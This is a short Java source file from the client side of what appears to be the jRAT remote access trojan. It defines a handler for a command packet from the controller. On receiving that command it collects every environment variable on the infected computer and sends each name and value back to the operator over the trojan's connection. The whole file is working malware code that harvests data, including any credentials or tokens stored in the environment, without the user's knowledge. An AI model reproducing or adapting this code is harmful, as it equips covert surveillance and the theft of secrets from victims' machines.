package jrat.client.packets.incoming;

import jrat.client.Connection;
import jrat.client.packets.outgoing.Packet32SystemProperties;

import java.util.Set;

public class Packet96EnvironmentVariables implements IncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		Set<String> set = System.getenv().keySet();
		for (String str : set) {
			con.addToSendQueue(new Packet32SystemProperties(str, System.getenv().get(str)));
		}
	}

}
